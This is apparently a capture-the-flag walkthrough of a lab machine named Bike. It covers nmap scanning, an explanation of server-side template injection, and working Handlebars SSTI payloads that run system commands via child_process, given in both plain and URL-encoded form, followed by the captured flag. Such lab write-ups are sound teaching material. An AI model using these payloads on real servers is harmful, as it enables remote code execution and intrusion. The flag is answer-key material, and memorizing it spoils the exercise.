# Enumeration

Start nmap:

```shell
└─$ cat enumeration/nmap.txt  
# Nmap 7.92 scan initiated Thu Sep  1 17:57:33 2022 as: nmap -sC -sV -v -o nmap.txt 10.129.161.96
Nmap scan report for 10.129.161.96
Host is up (0.031s latency).
Not shown: 998 closed tcp ports (conn-refused)
PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 8.2p1 Ubuntu 4ubuntu0.4 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   3072 48:ad:d5:b8:3a:9f:bc:be:f7:e8:20:1e:f6:bf:de:ae (RSA)
|   256 b7:89:6c:0b:20:ed:49:b2:c1:86:7c:29:92:74:1c:1f (ECDSA)
|_  256 18:cd:9d:08:a6:21:a8:b8:b6:f7:9f:8d:40:51:54:fb (ED25519)
80/tcp open  http    Node.js (Express middleware)
|_http-title:  Bike 
| http-methods: 
|_  Supported Methods: GET HEAD POST OPTIONS
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

Read data files from: /usr/bin/../share/nmap
Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
# Nmap done at Thu Sep  1 17:57:41 2022 -- 1 IP address (1 host up) scanned in 8.42 seconds
                                                                                                                                                                                                                                   
┌──(darthv㉿elite)-[~/git/badorius/vulnhub/Bike]
```
Open browser http://10.129.161.96  and check wappalyzer information:

Both Nmap and Wappalyzer have reported that the server is built on Node.js and is using the Express
framework.
What is Node.js?
Node.js is an open-source, cross-platform, back-end JavaScript runtime environment that can be used to build
scalable network applications.
What is Express?
Express is a minimal and flexible Node.js web application framework that provides a robust set of features for web
and mobile applications.

What is a Template Engine?
Template Engines are used to display dynamically generated content on a web page. They replace the
variables inside a template file with actual values and display these values to the client (i.e. a user opening a
page through their browser)

What is an SSTI?
Server-side template injection is a vulnerability where the attacker injects malicious input into a template in order
to execute commands on the server.

# IDENTIFICATION

In order to exploit a potential SSTI vulnerability we will need to first confirm its existence. After researching
for common SSTI payloads on Google, we find this [Hacktricks](https://book.hacktricks.xyz/pentesting-web/ssti-server-side-template-injection) article that showcases exploitation techniques
for various different template engines. 

Let's try {{7*7}} on contact form, and get the following error:
```json
	
0	"Error: Parse error on line 1:"
1	"{{7*7}}"
2	"--^"
3	"Expecting 'ID', 'STRING', 'NUMBER', 'BOOLEAN', 'UNDEFINED', 'NULL', 'DATA', got 'INVALID'"
4	"    at Parser.parseError (/root/Backend/node_modules/handlebars/dist/cjs/handlebars/compiler/parser.js:268:19)"
5	"    at Parser.parse (/root/Backend/node_modules/handlebars/dist/cjs/handlebars/compiler/parser.js:337:30)"
6	"    at HandlebarsEnvironment.parse (/root/Backend/node_modules/handlebars/dist/cjs/handlebars/compiler/base.js:46:43)"
7	"    at compileInput (/root/Backend/node_modules/handlebars/dist/cjs/handlebars/compiler/compiler.js:515:19)"
8	"    at ret (/root/Backend/node_modules/handlebars/dist/cjs/handlebars/compiler/compiler.js:524:18)"
9	"    at router.post (/root/Backend/routes/handlers.js:15:18)"
10	"    at Layer.handle [as handle_request] (/root/Backend/node_modules/express/lib/router/layer.js:95:5)"
11	"    at next (/root/Backend/node_modules/express/lib/router/route.js:137:13)"
12	"    at Route.dispatch (/root/Backend/node_modules/express/lib/router/route.js:112:3)"
13	"    at Layer.handle [as handle_request] (/root/Backend/node_modules/express/lib/router/layer.js:95:5)"
```

This means that the payload was indeed detected as valid by the template engine, however the code had
some error and was unable to be executed. An error is not always a bad thing. On the contrary for a
Penetration Tester, it can provide valuable information. In this case we can see that the server is running
from the /root/Backend directory and also that the Handlebars Template Engine is being used.

# EXPLOTATION

Browse site with burpsuite and send to repeater just on {{7*7}} POST, 
Take a look on [Hacktrick](https://book.hacktricks.xyz/pentesting-web/ssti-server-side-template-injectionG) section that is titled " Handlebars (NodeJS) " 

```json
{{#with "s" as |string|}}
{{#with "e"}}
{{#with split as |conslist|}}
{{this.pop}}
{{this.push (lookup string.sub "constructor")}}
{{this.pop}}
{{#with string.split as |codelist|}}
{{this.pop}}
{{this.push "return require('child_process').exec('whoami');"}}
{{this.pop}}
{{#each conslist}}
{{#with (string.sub.apply 0 codelist)}}
{{this}}
{{/with}}
{{/each}}
{{/with}}
{{/with}}
{{/with}}
{{/with}}
```

Lets focused on ```json {{this.push "return require('child_process').exec('whoami');"}}```

To pass this payload to server we need to URL Encodeing the payload:

# URL Encoding

When making a request to a web server, the data that we send can only contain certain characters from the
standard 128 character ASCII set. Reserved characters that do not belong to this set must be encoded. For
this reason we use an encoding procedure that is called URL Encoding .
With this process for instance, the reserved character & becomes %26 . Luckily, BurpSuite has a tab called
Decoder that allows us to either decode or encode the text of our choice with various different encoding
methods, including URL.
Let's paste the above payload into the top pane of the Decoder and select Encode as > URL

Copy the URL encoded payload that is in the bottom pane and paste it in the email= field via the request
tab. You will get something similar to the following image.

After encode as URL, we can send to repeater as follow:
```html
POST / HTTP/1.1
Host: 10.129.161.96
Content-Length: 14
Cache-Control: max-age=0
Upgrade-Insecure-Requests: 1
Origin: http://10.129.161.96
Content-Type: application/x-www-form-urlencoded
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/103.0.5060.134 Safari/537.36

Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9

Referer: http://10.129.161.96/

Accept-Encoding: gzip, deflate

Accept-Language: en-US,en;q=0.9

Connection: close

%7b%7b%23%77%69%74%68%20%22%73%22%20%61%73%20%7c%73%74%72%69%6e%67%7c%7d%7d%0a%20%20%7b%7b%23%77%69%74%68%20%22%65%22%7d%7d%0a%20%20%20%20%7b%7b%23%77%69%74%68%20%73%70%6c%69%74%20%61%73%20%7c%63%6f%6e%73%6c%69%73%74%7c%7d%7d%0a%20%20%20%20%20%20%7b%7b%74%68%69%73%2e%70%6f%70%7d%7d%0a%20%20%20%20%20%20%7b%7b%74%68%69%73%2e%70%75%73%68%20%28%6c%6f%6f%6b%75%70%20%73%74%72%69%6e%67%2e%73%75%62%20%22%63%6f%6e%73%74%72%75%63%74%6f%72%22%29%7d%7d%0a%20%20%20%20%20%20%7b%7b%74%68%69%73%2e%70%6f%70%7d%7d%0a%20%20%20%20%20%20%7b%7b%23%77%69%74%68%20%73%74%72%69%6e%67%2e%73%70%6c%69%74%20%61%73%20%7c%63%6f%64%65%6c%69%73%74%7c%7d%7d%0a%20%20%20%20%20%20%20%20%7b%7b%74%68%69%73%2e%70%6f%70%7d%7d%0a%20%20%20%20%20%20%20%20%7b%7b%74%68%69%73%2e%70%75%73%68%20%22%72%65%74%75%72%6e%20%72%65%71%75%69%72%65%28%27%63%68%69%6c%64%5f%70%72%6f%63%65%73%73%27%29%2e%65%78%65%63%28%27%77%68%6f%61%6d%69%27%29%3b%22%7d%7d%0a%20%20%20%20%20%20%20%20%7b%7b%74%68%69%73%2e%70%6f%70%7d%7d%0a%20%20%20%20%20%20%20%20%7b%7b%23%65%61%63%68%20%63%6f%6e%73%6c%69%73%74%7d%7d%0a%20%20%20%20%20%20%20%20%20%20%7b%7b%23%77%69%74%68%20%28%73%74%72%69%6e%67%2e%73%75%62%2e%61%70%70%6c%79%20%30%20%63%6f%64%65%6c%69%73%74%29%7d%7d%0a%20%20%20%20%20%20%20%20%20%20%20%20%7b%7b%74%68%69%73%7d%7d%0a%20%20%20%20%20%20%20%20%20%20%7b%7b%2f%77%69%74%68%7d%7d%0a%20%20%20%20%20%20%20%20%7b%7b%2f%65%61%63%68%7d%7d%0a%20%20%20%20%20%20%7b%7b%2f%77%69%74%68%7d%7d%0a%20%20%20%20%7b%7b%2f%77%69%74%68%7d%7d%0a%20%20%7b%7b%2f%77%69%74%68%7d%7d%0a%7b%7b%2f%77%69%74%68%7d%7d
email=
&action=Submit
```

Repeater response:
```html
HTTP/1.1 400 Bad Request

Connection: close
```
Template Engines are often Sandboxed, meaning their code runs in a restricted code space so that in the
event of malicious code being run, it will be very hard to load modules that can run system commands. If we
cannot directly use require to load such modules, we will have to find a different way.

Change push with this one:

```nodejs
{{#with "s" as |string|}}
  {{#with "e"}}
    {{#with split as |conslist|}}
      {{this.pop}}
      {{this.push (lookup string.sub "constructor")}}
      {{this.pop}}
      {{#with string.split as |codelist|}}
        {{this.pop}}
        {{this.push "return process.mainModule.require('child_process').execSync('ls /root');"}}
        {{this.pop}}
        {{#each conslist}}
          {{#with (string.sub.apply 0 codelist)}}
            {{this}}
          {{/with}}
        {{/each}}
      {{/with}}
    {{/with}}
  {{/with}}
{{/with}}
```

Resppone:
```nodejs
   <p class="result">
        We will contact you at: 

      e
      2
      [object Object]
        function Function() { [native code] }
        2
        [object Object]
            Backend
flag.txt
snap
```

Get the flag: 6b258d726d287462d60c103d0142a81c 
